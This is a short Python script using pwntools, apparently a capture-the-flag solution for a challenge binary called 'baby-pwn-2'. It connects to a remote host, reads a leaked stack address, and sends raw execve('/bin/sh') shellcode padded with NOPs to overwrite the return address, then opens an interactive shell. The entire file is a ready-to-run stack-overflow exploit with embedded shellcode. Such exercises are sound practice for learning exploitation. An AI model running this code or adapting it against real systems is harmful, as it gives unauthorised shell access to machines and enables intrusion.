#!/bin/python3

from pwn import *
import struct 

elf = context.binary = ELF('./baby-pwn-2', checksec= False)
io = remote('34.162.119.16', 5000)
#io = process()

context.log_level = 'debug'

def get_add(p):
    p.recvuntil(b"leak: ")
    add = p.recvline()

    return add

address= pack(int(get_add(io), 16))

shell = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

buffer = b"\x90"*(72-len(shell))
payload = shell+buffer+address


io.sendline(payload)
io.interactive()

